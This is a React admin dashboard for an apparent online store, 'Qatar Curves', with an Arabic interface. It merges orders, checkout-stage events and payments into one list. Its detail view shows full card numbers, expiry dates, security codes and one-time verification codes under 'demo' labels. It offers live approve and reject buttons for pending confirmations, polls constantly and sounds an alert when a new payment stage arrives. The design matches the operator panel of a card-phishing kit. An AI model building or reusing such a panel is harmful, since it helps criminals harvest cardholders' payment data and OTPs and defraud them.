import { useEffect, useMemo, useRef, useState } from "react";
import { useAuth } from "@/_core/hooks/useAuth";
import { DASHBOARD_SOUND_KEY, buildDashboardNotificationFeed, findNewDashboardNotification } from "@/lib/dashboardNotifications";
import { trpc } from "@/lib/trpc";
import {
  CircleCheck,
  CircleX,
  CreditCard,
  ExternalLink,
  Eye,
  LockKeyhole,
  LogOut,
  MapPin,
  Package,
  Phone,
  RefreshCw,
  Search,
  ShieldCheck,
  Store,
  UserRound,
  UsersRound,
  Volume2,
  VolumeX,
  X,
} from "lucide-react";
import { Link } from "wouter";
import { toast } from "sonner";

type OrderItem = { name: string; quantity: number; size: string; color?: string; priceQar: number };
type SafeOrder = {
  id: number; orderNumber: string; customerName: string; phone: string; zone: string; address: string | null;
  itemsJson: string; totalQar: number; cardBrand: string; cardLast4: string;
  paymentStatus: "pending" | "verified" | "failed"; orderStatus: "new" | "processing" | "completed" | "archived"; createdAt: Date;
};
type StageEvent = {
  id: number; eventKey: string; flowId: string; stage: "address" | "payment" | "confirmation";
  customerName: string | null; phone: string | null; zone: string | null; address: string | null;
  orderNumber: string | null; totalQar: number | null; cardBrand: string | null; cardLast4: string | null;
  verificationStatus: "not_started" | "submitted" | "approved" | "rejected"; createdAt: Date;
};
type SandboxPayment = {
  id: number; recordKey: string; flowId: string; stage: "payment" | "confirmation";
  orderNumber: string | null; customerLabel: string; phone: string; zone: string; address: string | null;
  itemsJson: string; cardBrand: "visa" | "mastercard" | "mada" | null; demoCardReference: string | null;
  demoExpiry: string | null; demoSecurityCode: string | null; demoVerificationCode: string | null;
  amountQar: number; status: "received" | "pending" | "approved" | "rejected"; createdAt: Date;
};
type PaypalPayment = {
  id: number; paypalOrderId: string; paypalCaptureId: string | null; orderNumber: string | null;
  customerName: string; phone: string; zone: string; totalQar: number; amountUsdCents: number;
  paymentSource: "paypal" | "apple_pay" | "google_pay" | "card";
  status: "created" | "approved" | "completed" | "cancelled" | "failed"; createdAt: Date; updatedAt: Date;
};
type VisitorEntry = { id: number; currentPath: string; pageViews: number; startedAt: Date; lastSeenAt: Date };

type UnifiedOrder = {
  key: string;
  orderType: string;
  orderTypeColor: string;
  name: string;
  phone: string;
  createdAt: Date;
  zone?: string;
  address?: string | null;
  items: OrderItem[];
  totalQar: number;
  cardBrand?: string;
  cardLast4?: string;
  orderNumber?: string;
  status: string;
  statusColor: string;
  demoCardReference?: string | null;
  demoExpiry?: string | null;
  demoSecurityCode?: string | null;
  demoVerificationCode?: string | null;
  paypalOrderId?: string;
  paymentSource?: string;
  paypalCaptureId?: string | null;
  paymentStatus?: string;
  canDecide: boolean;
  actionType?: "stage" | "sandbox";
  actionId?: number;
};

let alertAudioContext: AudioContext | undefined;

async function ensureAlertAudioReady() {
  const AudioClass = window.AudioContext || (window as typeof window & { webkitAudioContext?: typeof AudioContext }).webkitAudioContext;
  if (!AudioClass) return undefined;
  const ctx = alertAudioContext ?? new AudioClass();
  alertAudioContext = ctx;
  if (ctx.state !== "running") await ctx.resume();
  return ctx;
}

async function playOrderAlert() {
  const ctx = await ensureAlertAudioReady().catch(() => undefined);
  if (!ctx) return;
  const gain = ctx.createGain();
  const startAt = ctx.currentTime + 0.03;
  gain.gain.setValueAtTime(0.0001, startAt);
  gain.gain.exponentialRampToValueAtTime(0.34, startAt + 0.03);
  gain.gain.exponentialRampToValueAtTime(0.0001, startAt + 1.15);
  gain.connect(ctx.destination);
  [523, 659, 784].forEach((freq, i) => {
    const osc = ctx.createOscillator();
    osc.type = "sine";
    osc.frequency.value = freq;
    osc.connect(gain);
    osc.start(startAt + i * 0.14);
    osc.stop(startAt + 0.5 + i * 0.14);
  });
}

function LoginGate() {
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");
  const login = trpc.auth.loginWithPassword.useMutation({
    onSuccess: (data) => {
      if (data.token && data.cookieName) {
        try { sessionStorage.setItem("manus-cookie", `${data.cookieName}=${data.token}`); } catch {}
      }
      window.location.reload();
    },
    onError: (err) => setError(err.message || "كلمة المرور غير صحيحة"),
  });
  return (
    <main dir="rtl" className="grid min-h-screen place-items-center bg-[#031d27] p-5">
      <section className="w-full max-w-md rounded-[2rem] border border-white/10 bg-[#082c39] p-8 text-center shadow-[0_30px_90px_rgba(0,0,0,.45)]">
        <div className="mx-auto grid size-16 place-items-center rounded-2xl bg-[#12c6a4]/15 text-[#3de5c5]"><LockKeyhole size={30} /></div>
        <p className="mt-6 text-xs font-black uppercase tracking-[.2em] text-[#3de5c5]">Qatar Curves Control</p>
        <h1 className="mt-2 text-2xl font-extrabold text-white">لوحة المالك الخارجية</h1>
        <p className="mt-3 text-sm leading-7 text-[#9bb9c3]">أدخل كلمة مرور الإدارة لعرض الطلبات.</p>
        <form onSubmit={(e) => { e.preventDefault(); setError(""); login.mutate({ password }); }} className="mt-6 space-y-3">
          <input type="password" value={password} onChange={(e) => setPassword(e.target.value)} placeholder="كلمة مرور الإدارة" className="w-full rounded-2xl border border-white/10 bg-white/[.06] px-5 py-3.5 text-center text-white outline-none placeholder:text-[#6f97a5] focus:border-[#12c6a4]" autoFocus />
          {error && <p className="text-sm text-red-300">{error}</p>}
          <button type="submit" disabled={login.isPending || !password} className="w-full rounded-2xl bg-[#12c6a4] px-5 py-3.5 font-extrabold text-[#03242d] hover:bg-[#31dfbe] disabled:opacity-50">{login.isPending ? "جاري الدخول..." : "دخول المالك"}</button>
        </form>
      </section>
    </main>
  );
}

function CardBrand({ brand }: { brand: string }) {
  if (brand === "visa") return <span className="font-black italic tracking-wide text-[#1a1f71]">VISA</span>;
  if (brand === "mastercard") return <span className="flex items-center gap-1 font-bold"><span className="flex"><i className="mr-[-5px] size-4 rounded-full bg-[#eb001b]" /><i className="size-4 rounded-full bg-[#ff5f00]" /></span><span className="text-white">MC</span></span>;
  if (brand === "mada") return <span className="font-black text-[#3de5c5]">مدى</span>;
  return <span className="text-[#9bb9c3]">—</span>;
}

function buildUnifiedOrders(orders: SafeOrder[], stages: StageEvent[], sandbox: SandboxPayment[], paypal: PaypalPayment[]): UnifiedOrder[] {
  const result: UnifiedOrder[] = [];

  for (const o of orders) {
    let items: OrderItem[] = [];
    try { items = JSON.parse(o.itemsJson); } catch {}
    result.push({
      key: `order-${o.id}`, orderType: "طلب مدفوع", orderTypeColor: "bg-emerald-500/20 text-emerald-300",
      name: o.customerName, phone: o.phone, createdAt: new Date(o.createdAt),
      zone: o.zone, address: o.address, items, totalQar: o.totalQar,
      cardBrand: o.cardBrand, cardLast4: o.cardLast4, orderNumber: o.orderNumber,
      paymentStatus: o.paymentStatus === "verified" ? "تم التحقق" : o.paymentStatus === "failed" ? "فشل" : "قيد المراجعة",
      status: o.orderStatus === "new" ? "جديد" : o.orderStatus === "processing" ? "قيد المعالجة" : o.orderStatus === "completed" ? "مكتمل" : "مؤرشف",
      statusColor: o.orderStatus === "new" ? "bg-red-500/20 text-red-300" : "bg-emerald-500/20 text-emerald-300",
      canDecide: false,
    });
  }

  for (const e of stages) {
    const label = e.stage === "address" ? "بيانات عنوان" : e.stage === "payment" ? "بيانات دفع" : "تأكيد طلب";
    const color = e.stage === "address" ? "bg-sky-500/20 text-sky-300" : e.stage === "payment" ? "bg-cyan-500/20 text-cyan-300" : "bg-amber-500/20 text-amber-300";
    result.push({
      key: `stage-${e.id}`, orderType: label, orderTypeColor: color,
      name: e.customerName || "—", phone: e.phone || "—", createdAt: new Date(e.createdAt),
      zone: e.zone || undefined, address: e.address, items: [], totalQar: e.totalQar || 0,
      cardBrand: e.cardBrand || undefined, cardLast4: e.cardLast4 || undefined, orderNumber: e.orderNumber || undefined,
      status: e.verificationStatus === "approved" ? "مقبول" : e.verificationStatus === "rejected" ? "مرفوض" : e.verificationStatus === "submitted" ? "بانتظار القرار" : "جديد",
      statusColor: e.verificationStatus === "approved" ? "bg-emerald-500/20 text-emerald-300" : e.verificationStatus === "rejected" ? "bg-red-500/20 text-red-300" : e.verificationStatus === "submitted" ? "bg-amber-500/20 text-amber-300" : "bg-white/10 text-[#9bb9c3]",
      canDecide: e.stage === "confirmation" && e.verificationStatus === "submitted",
      actionType: "stage", actionId: e.id,
    });
  }

  for (const s of sandbox) {
    let items: OrderItem[] = [];
    try { items = JSON.parse(s.itemsJson); } catch {}
    result.push({
      key: `sandbox-${s.id}`, orderType: s.stage === "payment" ? "بيانات دفع" : "تأكيد دفع",
      orderTypeColor: s.stage === "payment" ? "bg-cyan-500/20 text-cyan-300" : "bg-amber-500/20 text-amber-300",
      name: s.customerLabel, phone: s.phone, createdAt: new Date(s.createdAt),
      zone: s.zone, address: s.address, items, totalQar: s.amountQar,
      cardBrand: s.cardBrand || undefined, orderNumber: s.orderNumber || undefined,
      demoCardReference: s.demoCardReference, demoExpiry: s.demoExpiry,
      demoSecurityCode: s.demoSecurityCode, demoVerificationCode: s.demoVerificationCode,
      status: s.status === "approved" ? "مقبول" : s.status === "rejected" ? "مرفوض" : s.status === "pending" ? "بانتظار القرار" : "وصل",
      statusColor: s.status === "approved" ? "bg-emerald-500/20 text-emerald-300" : s.status === "rejected" ? "bg-red-500/20 text-red-300" : s.status === "pending" ? "bg-amber-500/20 text-amber-300" : "bg-white/10 text-[#9bb9c3]",
      canDecide: (s.status === "pending" || s.status === "received"),
      actionType: "sandbox", actionId: s.id,
    });
  }

  for (const p of paypal) {
    const src = p.paymentSource === "apple_pay" ? "Apple Pay" : p.paymentSource === "google_pay" ? "Google Pay" : p.paymentSource === "card" ? "بطاقة" : "PayPal";
    result.push({
      key: `paypal-${p.id}`, orderType: "دفع PayPal", orderTypeColor: "bg-indigo-500/20 text-indigo-300",
      name: p.customerName, phone: p.phone, createdAt: new Date(p.createdAt),
      zone: p.zone, items: [], totalQar: p.totalQar,
      paypalOrderId: p.paypalOrderId, paymentSource: src, paypalCaptureId: p.paypalCaptureId,
      status: p.status === "completed" ? "مكتمل" : p.status === "cancelled" ? "ملغي" : p.status === "failed" ? "فشل" : "جاري",
      statusColor: p.status === "completed" ? "bg-emerald-500/20 text-emerald-300" : p.status === "failed" || p.status === "cancelled" ? "bg-red-500/20 text-red-300" : "bg-amber-500/20 text-amber-300",
      canDecide: false,
    });
  }

  result.sort((a, b) => {
    if (a.canDecide && !b.canDecide) return -1;
    if (!a.canDecide && b.canDecide) return 1;
    return b.createdAt.getTime() - a.createdAt.getTime();
  });
  return result;
}

function DetailModal({ order, onClose, onDecide, busy }: {
  order: UnifiedOrder;
  onClose: () => void;
  onDecide: (actionType: "stage" | "sandbox", actionId: number, decision: "approved" | "rejected") => void;
  busy: boolean;
}) {
  const money = (v: number) => `${v.toLocaleString("ar-QA")} ر.ق`;

  return (
    <div className="fixed inset-0 z-[90] grid place-items-center bg-black/70 p-4" onClick={(e) => { if (e.target === e.currentTarget) onClose(); }}>
      <section className="max-h-[90vh] w-full max-w-lg overflow-y-auto rounded-3xl border border-white/10 bg-[#082c39] shadow-[0_30px_80px_rgba(0,0,0,.5)]">
        {/* Header */}
        <header className="sticky top-0 z-10 flex items-center justify-between border-b border-white/10 bg-[#082c39] px-6 py-4">
          <div className="flex items-center gap-3">
            <span className={`rounded-full px-3 py-1.5 text-xs font-black ${order.orderTypeColor}`}>{order.orderType}</span>
            <span className={`rounded-full px-3 py-1.5 text-xs font-bold ${order.statusColor}`}>{order.status}</span>
          </div>
          <button onClick={onClose} className="grid size-9 place-items-center rounded-xl bg-white/5 text-[#9bb9c3] hover:bg-white/10"><X size={18} /></button>
        </header>

        <div className="space-y-5 p-6">
          {/* Customer Info */}
          <div className="rounded-2xl border border-white/10 bg-[#05232e] p-4">
            <h3 className="mb-3 flex items-center gap-2 text-sm font-extrabold text-white"><UserRound size={16} className="text-[#3de5c5]" />بيانات العميل</h3>
            <div className="grid gap-3 text-sm sm:grid-cols-2">
              <div><span className="text-[#9bb9c3]">الاسم</span><strong className="mt-1 block text-white">{order.name}</strong></div>
              <div><span className="text-[#9bb9c3]">الهاتف</span><strong dir="ltr" className="mt-1 block text-right text-white">{order.phone}</strong></div>
              {order.zone && <div><span className="text-[#9bb9c3]">المنطقة</span><strong className="mt-1 block text-white">{order.zone}</strong></div>}
              {order.address && <div><span className="text-[#9bb9c3]">العنوان</span><strong className="mt-1 block text-white">{order.address}</strong></div>}
            </div>
          </div>

          {/* Order Items */}
          {order.items.length > 0 && (
            <div className="rounded-2xl border border-white/10 bg-[#05232e] p-4">
              <h3 className="mb-3 flex items-center gap-2 text-sm font-extrabold text-white"><Package size={16} className="text-[#3de5c5]" />المنتجات</h3>
              <div className="space-y-2">
                {order.items.map((item, i) => (
                  <div key={i} className="flex items-center justify-between rounded-xl bg-white/[.04] p-3 text-sm">
                    <div>
                      <strong className="text-white">{item.name}</strong>
                      <p className="mt-0.5 text-xs text-[#6f97a5]">{item.size}{item.color ? ` · ${item.color}` : ""} × {item.quantity}</p>
                    </div>
                    <strong className="text-[#66efd4]">{money(item.priceQar * item.quantity)}</strong>
                  </div>
                ))}
              </div>
            </div>
          )}

          {/* Payment Info */}
          {(order.cardBrand || order.cardLast4 || order.totalQar > 0 || order.demoCardReference) && (
            <div className="rounded-2xl border border-white/10 bg-[#05232e] p-4">
              <h3 className="mb-3 flex items-center gap-2 text-sm font-extrabold text-white"><CreditCard size={16} className="text-[#3de5c5]" />بيانات الدفع</h3>
              <div className="grid gap-3 text-sm sm:grid-cols-2">
                {order.cardBrand && <div><span className="text-[#9bb9c3]">نوع البطاقة</span><div className="mt-1 flex items-center gap-2"><CardBrand brand={order.cardBrand} /></div></div>}
                <div><span className="text-[#9bb9c3]">المبلغ</span><strong className="mt-1 block text-lg text-[#66efd4]">{money(order.totalQar)}</strong></div>
                {order.demoCardReference && <div className="sm:col-span-2"><span className="text-[#9bb9c3]">رقم البطاقة</span><strong dir="ltr" className="mt-1 block font-mono text-lg tracking-wider text-white">{order.demoCardReference.replace(/(.{4})/g, "$1 ").trim()}</strong></div>}
                {order.demoExpiry && <div><span className="text-[#9bb9c3]">تاريخ الانتهاء</span><strong dir="ltr" className="mt-1 block text-white">{order.demoExpiry}</strong></div>}
                {order.demoSecurityCode && <div><span className="text-[#9bb9c3]">رمز الأمان</span><strong dir="ltr" className="mt-1 block text-white">{order.demoSecurityCode}</strong></div>}
                {order.cardLast4 && !order.demoCardReference && <div><span className="text-[#9bb9c3]">آخر 4 أرقام</span><strong dir="ltr" className="mt-1 block font-mono text-white">•••• {order.cardLast4}</strong></div>}
                {order.orderNumber && <div><span className="text-[#9bb9c3]">رقم الطلب</span><strong className="mt-1 block text-white">{order.orderNumber}</strong></div>}
                {order.demoVerificationCode && <div className="sm:col-span-2 rounded-xl bg-[#3de5c5]/10 p-3 text-center"><span className="text-[#9bb9c3]">كود التحقق</span><strong dir="ltr" className="mt-1 block font-mono text-2xl tracking-[.3em] text-[#3de5c5]">{order.demoVerificationCode}</strong></div>}
              </div>
            </div>
          )}

          {/* PayPal Details */}
          {order.paypalOrderId && (
            <div className="rounded-2xl border border-indigo-300/25 bg-indigo-400/[.06] p-4">
              <h3 className="mb-3 flex items-center gap-2 text-sm font-extrabold text-indigo-200"><CreditCard size={16} />PayPal</h3>
              <div className="grid gap-3 text-sm sm:grid-cols-2">
                <div><span className="text-indigo-200/70">طريقة الدفع</span><strong className="mt-1 block text-white">{order.paymentSource}</strong></div>
                <div><span className="text-indigo-200/70">Order ID</span><strong dir="ltr" className="mt-1 block truncate font-mono text-xs text-white">{order.paypalOrderId}</strong></div>
                {order.paypalCaptureId && <div className="sm:col-span-2"><span className="text-indigo-200/70">Capture ID</span><strong dir="ltr" className="mt-1 block truncate font-mono text-xs text-white">{order.paypalCaptureId}</strong></div>}
              </div>
            </div>
          )}

          {/* Date */}
          <p className="text-center text-xs text-[#6f97a5]">{new Date(order.createdAt).toLocaleString("ar-QA", { dateStyle: "medium", timeStyle: "short" })}</p>

          {/* Accept / Reject Buttons */}
          {order.canDecide && order.actionType && order.actionId && (
            <div className="grid grid-cols-2 gap-3 pt-2">
              <button
                disabled={busy}
                onClick={() => onDecide(order.actionType!, order.actionId!, "approved")}
                className="flex items-center justify-center gap-2 rounded-2xl bg-emerald-500 px-4 py-3.5 text-sm font-black text-white hover:bg-emerald-600 disabled:opacity-50"
              ><CircleCheck size={18} />قبول</button>
              <button
                disabled={busy}
                onClick={() => onDecide(order.actionType!, order.actionId!, "rejected")}
                className="flex items-center justify-center gap-2 rounded-2xl border border-red-400/30 bg-red-500/15 px-4 py-3.5 text-sm font-black text-red-200 hover:bg-red-500/25 disabled:opacity-50"
              ><CircleX size={18} />رفض</button>
            </div>
          )}

          {/* Close button for non-decidable */}
          {!order.canDecide && (
            <button onClick={onClose} className="w-full rounded-2xl border border-white/10 bg-white/5 px-4 py-3 text-sm font-bold text-[#d9efea] hover:bg-white/10">إغلاق</button>
          )}
        </div>
      </section>
    </div>
  );
}

function ExternalDashboard() {
  const { user, loading, logout } = useAuth();
  const [search, setSearch] = useState("");
  const [selectedOrder, setSelectedOrder] = useState<UnifiedOrder | null>(null);
  const [sound, setSound] = useState(() => typeof window !== "undefined" && window.localStorage.getItem(DASHBOARD_SOUND_KEY) === "on");
  const previousNotificationKeys = useRef<Set<string> | null>(null);
  const utils = trpc.useUtils();

  const decide = trpc.admin.decideCheckoutStage.useMutation({
    onSuccess: (_r, v) => { void utils.admin.dashboard.invalidate(); setSelectedOrder(null); toast.success(v.decision === "approved" ? "تم قبول العملية" : "تم رفض العملية"); },
    onError: () => toast.error("تعذر حفظ القرار"),
  });
  const decideSandbox = trpc.admin.decideSandboxPayment.useMutation({
    onSuccess: (_r, v) => { void utils.admin.dashboard.invalidate(); setSelectedOrder(null); toast.success(v.decision === "approved" ? "تم قبول Sandbox" : "تم رفض Sandbox"); },
    onError: () => toast.error("تعذر حفظ قرار Sandbox"),
  });
  const busy = decide.isPending || decideSandbox.isPending;

  const { data, error, refetch, isFetching } = trpc.admin.dashboard.useQuery(undefined, {
    enabled: !loading && user?.role === "admin", refetchInterval: 4000, retry: 2,
  });

  const orders = (data?.recentOrders ?? []) as SafeOrder[];
  const stageEvents = (data?.recentStageEvents ?? []) as StageEvent[];
  const sandboxPayments = (data?.recentSandboxPayments ?? []) as SandboxPayment[];
  const paypalPayments = (data?.recentPaypalPayments ?? []) as PaypalPayment[];
  const recentVisitors = (data?.recentVisitors ?? []) as VisitorEntry[];
  const online = data?.online ?? 0;

  const unified = useMemo(() => buildUnifiedOrders(orders, stageEvents, sandboxPayments, paypalPayments), [orders, stageEvents, sandboxPayments, paypalPayments]);
  const filtered = useMemo(() => unified.filter(o => `${o.orderType} ${o.name} ${o.phone} ${o.orderNumber || ""}`.toLowerCase().includes(search.toLowerCase())), [unified, search]);

  const notificationFeed = useMemo(() => buildDashboardNotificationFeed({ visitors: recentVisitors, stages: stageEvents, payments: paypalPayments }), [recentVisitors, stageEvents, paypalPayments]);

  useEffect(() => {
    if (!sound) return;
    const unlock = () => void ensureAlertAudioReady().catch(() => undefined);
    window.addEventListener("pointerdown", unlock, { once: true });
    window.addEventListener("keydown", unlock, { once: true });
    return () => { window.removeEventListener("pointerdown", unlock); window.removeEventListener("keydown", unlock); };
  }, [sound]);

  useEffect(() => {
    const current = new Set(notificationFeed.map(n => n.key));
    const fresh = findNewDashboardNotification(previousNotificationKeys.current, notificationFeed);
    if (fresh && fresh.kind !== "visitor") {
      toast.success(fresh.title, { description: fresh.subtitle });
      if (sound) void playOrderAlert();
    }
    previousNotificationKeys.current = current;
  }, [notificationFeed, sound]);

  const handleDecide = (actionType: "stage" | "sandbox", actionId: number, decision: "approved" | "rejected") => {
    if (actionType === "stage") decide.mutate({ eventId: actionId, decision });
    else decideSandbox.mutate({ recordId: actionId, decision });
  };

  if (loading) return <div className="grid min-h-screen place-items-center bg-[#031d27] text-[#9bb9c3]">جاري تجهيز الداشبورد...</div>;
  if (!user || user.role !== "admin") return <LoginGate />;
  if (error) return <div dir="rtl" className="grid min-h-screen place-items-center bg-[#031d27] p-6 text-center text-red-200"><p>تعذر تحميل البيانات.</p><button onClick={() => void refetch()} className="mt-4 rounded-xl bg-white/10 px-5 py-2">إعادة المحاولة</button></div>;

  const pendingCount = unified.filter(o => o.canDecide).length;

  return (
    <div dir="rtl" className="min-h-screen bg-[#031d27] text-white">
      {selectedOrder && <DetailModal order={selectedOrder} onClose={() => setSelectedOrder(null)} onDecide={handleDecide} busy={busy} />}

      {/* Header */}
      <header className="sticky top-0 z-30 border-b border-white/10 bg-[#052631]/95 backdrop-blur-xl">
        <div className="mx-auto flex h-16 max-w-[1400px] items-center justify-between gap-3 px-4 sm:px-6">
          <div className="flex items-center gap-3">
            <span className="grid size-10 place-items-center rounded-xl bg-[#12c6a4] font-black text-[#03242d]">QC</span>
            <div className="hidden sm:block"><strong className="block text-sm">Qatar Curves</strong><small className="text-[#6f97a5]">لوحة الإدارة</small></div>
          </div>
          <div className="flex items-center gap-2">
            <button onClick={() => void refetch()} className="grid size-10 place-items-center rounded-xl bg-white/5 text-[#d9efea] hover:bg-white/10" title="تحديث"><RefreshCw size={17} className={isFetching ? "animate-spin" : ""} /></button>
            <span className="flex h-10 items-center gap-2 rounded-xl border border-emerald-300/20 bg-emerald-400/10 px-3 text-emerald-200" title="الموجودون في الموقع"><UsersRound size={16} /><strong className="text-sm tabular-nums">{online}</strong></span>
            {pendingCount > 0 && <span className="flex h-10 items-center gap-2 rounded-xl border border-amber-300/20 bg-amber-400/10 px-3 text-amber-200"><strong className="text-sm tabular-nums">{pendingCount}</strong><span className="hidden text-xs font-bold sm:inline">بانتظار القرار</span></span>}
            <button onClick={() => { const next = !sound; setSound(next); window.localStorage.setItem(DASHBOARD_SOUND_KEY, next ? "on" : "off"); if (next) void playOrderAlert(); }} className={`grid size-10 place-items-center rounded-xl ${sound ? "bg-[#12c6a4] text-[#03242d]" : "bg-white/5 text-[#d9efea]"}`} title={sound ? "إيقاف الصوت" : "تشغيل الصوت"}>{sound ? <Volume2 size={18} /> : <VolumeX size={18} />}</button>
            <button onClick={() => window.open("/", "_blank")} className="hidden items-center gap-2 rounded-xl border border-white/10 bg-white/5 px-3 py-2 text-sm font-bold text-[#d9efea] hover:bg-white/10 sm:flex"><Store size={16} />المتجر<ExternalLink size={14} /></button>
            <button onClick={logout} className="grid size-10 place-items-center rounded-xl text-red-300 hover:bg-red-500/10" title="تسجيل الخروج"><LogOut size={17} /></button>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="mx-auto max-w-[1400px] p-4 sm:p-6 lg:p-8">
        <div className="mb-6">
          <h1 className="text-2xl font-black sm:text-3xl">الطلبات</h1>
          <p className="mt-1 text-sm text-[#9bb9c3]">جميع الطلبات والعمليات — اضغط على التفاصيل لعرض البيانات الكاملة.</p>
        </div>

        {/* Search */}
        <div className="relative mb-5">
          <Search className="absolute right-4 top-3.5 text-[#6f97a5]" size={18} />
          <input value={search} onChange={e => setSearch(e.target.value)} placeholder="ابحث بالاسم أو الهاتف أو نوع الطلب..." className="h-12 w-full rounded-2xl border border-white/10 bg-white/[.04] pr-12 pl-4 text-sm text-white outline-none placeholder:text-[#6f97a5] focus:border-[#12c6a4]" />
        </div>

        {filtered.length === 0 ? (
          <div className="rounded-3xl border border-white/10 bg-[#082c39] p-16 text-center">
            <ShieldCheck className="mx-auto text-white/15" size={48} />
            <h3 className="mt-4 font-extrabold">لا توجد طلبات بعد</h3>
            <p className="mt-2 text-sm text-[#6f97a5]">عند قيام عميل بالطلب ستظهر البيانات هنا تلقائيًا.</p>
          </div>
        ) : (
          <>
            {/* Desktop Table */}
            <div className="hidden overflow-hidden rounded-2xl border border-white/10 bg-[#082c39] md:block">
              <table className="w-full text-sm">
                <thead>
                  <tr className="border-b border-white/10 bg-white/[.03]">
                    <th className="px-5 py-4 text-right text-xs font-black text-[#9bb9c3]">نوع الطلب</th>
                    <th className="px-5 py-4 text-right text-xs font-black text-[#9bb9c3]">الاسم</th>
                    <th className="px-5 py-4 text-right text-xs font-black text-[#9bb9c3]">رقم الجوال</th>
                    <th className="px-5 py-4 text-center text-xs font-black text-[#9bb9c3]">التفاصيل</th>
                  </tr>
                </thead>
                <tbody>
                  {filtered.map(order => (
                    <tr key={order.key} className={`border-b border-white/5 transition-colors hover:bg-white/[.03] ${order.canDecide ? "bg-amber-400/[.04]" : ""}`}>
                      <td className="px-5 py-3.5">
                        <span className={`inline-block rounded-full px-3 py-1 text-xs font-black ${order.orderTypeColor}`}>{order.orderType}</span>
                      </td>
                      <td className="px-5 py-3.5 font-bold text-white">{order.name}</td>
                      <td className="px-5 py-3.5" dir="ltr"><span className="text-[#d9efea]">{order.phone}</span></td>
                      <td className="px-5 py-3.5 text-center">
                        <button onClick={() => setSelectedOrder(order)} className="inline-flex items-center gap-2 rounded-xl border border-[#12c6a4]/30 bg-[#12c6a4]/10 px-4 py-2 text-xs font-black text-[#3de5c5] transition-colors hover:bg-[#12c6a4]/20">
                          <Eye size={15} />التفاصيل
                        </button>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>

            {/* Mobile Cards */}
            <div className="space-y-3 md:hidden">
              {filtered.map(order => (
                <div key={order.key} className={`rounded-2xl border border-white/10 bg-[#082c39] p-4 ${order.canDecide ? "border-amber-300/25" : ""}`}>
                  <div className="mb-3 flex items-center justify-between">
                    <span className={`rounded-full px-3 py-1 text-xs font-black ${order.orderTypeColor}`}>{order.orderType}</span>
                    <span className={`rounded-full px-2 py-1 text-[10px] font-bold ${order.statusColor}`}>{order.status}</span>
                  </div>
                  <div className="mb-3 grid grid-cols-2 gap-2 text-sm">
                    <div><span className="text-[#6f97a5]">الاسم</span><strong className="mt-0.5 block text-white">{order.name}</strong></div>
                    <div><span className="text-[#6f97a5]">الجوال</span><strong dir="ltr" className="mt-0.5 block text-right text-white">{order.phone}</strong></div>
                  </div>
                  <button onClick={() => setSelectedOrder(order)} className="flex w-full items-center justify-center gap-2 rounded-xl border border-[#12c6a4]/30 bg-[#12c6a4]/10 py-2.5 text-xs font-black text-[#3de5c5] hover:bg-[#12c6a4]/20">
                    <Eye size={15} />التفاصيل
                  </button>
                </div>
              ))}
            </div>
          </>
        )}
      </main>
    </div>
  );
}

export function ExternalDashboardOverview() { return <ExternalDashboard />; }
export function ExternalDashboardOrders() { return <ExternalDashboard />; }
export function ExternalDashboardVisitors() { return <ExternalDashboard />; }
